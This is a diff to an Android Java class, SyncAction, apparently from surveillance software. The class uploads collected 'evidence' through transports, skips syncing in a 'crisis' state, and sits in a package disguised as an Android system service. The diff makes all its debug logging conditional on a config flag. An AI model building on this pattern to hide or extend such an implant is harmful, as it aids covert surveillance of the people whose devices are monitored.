@@ -13,15 +13,13 @@ import java.util.Vector;
 
 import android.util.Log;
 
-import com.android.service.Debug;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
 import com.android.service.action.sync.ZProtocol;
-import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentManager;
 import com.android.service.agent.AgentType;
-import com.android.service.evidence.Evidence;
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.util.Check;
 
@@ -79,13 +77,13 @@ public abstract class SyncAction extends SubAction {
 		Check.requires(transports != null, "execute: null transports");
 
 		if (status.synced == true) {
-			Log.d("QZ", TAG + " Warn: "
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: "
 					+ "Already synced in this action: skipping");
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			Log.d("QZ", TAG + " Warn: "
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: "
 					+ "SyncAction - no sync, we are in crisis");
 			return false;
 		}
@@ -100,17 +98,17 @@ public abstract class SyncAction extends SubAction {
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-			Log.d("QZ", TAG + " execute transport: " + transport);
-			Log.d("QZ", TAG + " transport Sync url: " + transport.getUrl());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " execute transport: " + transport);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " transport Sync url: " + transport.getUrl());
 
 			if (transport.isAvailable()) {
-				Log.d("QZ", TAG + " execute: transport available");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " execute: transport available");
 				protocol.init(transport);
 
 				try {
 					ret = protocol.perform();
 				} catch (final ProtocolException e) {
-					Log.d("QZ", TAG + " Error: " + e.toString());
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
 					ret = false;
 				}
 
@@ -118,16 +116,16 @@ public abstract class SyncAction extends SubAction {
 				//wantReload = protocol.reload;
 
 			} else {
-				Log.d("QZ", TAG + " execute: transport not available");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " execute: transport not available");
 			}
 
 			if (ret) {
-				Log.d("QZ", TAG + " Info: SyncAction OK");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: SyncAction OK");
 				status.synced = true;
 				return true;
 			}
 
-			Log.d("QZ", TAG + " Error: SyncAction Unable to perform");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: SyncAction Unable to perform");
 		}
 
 		return false;
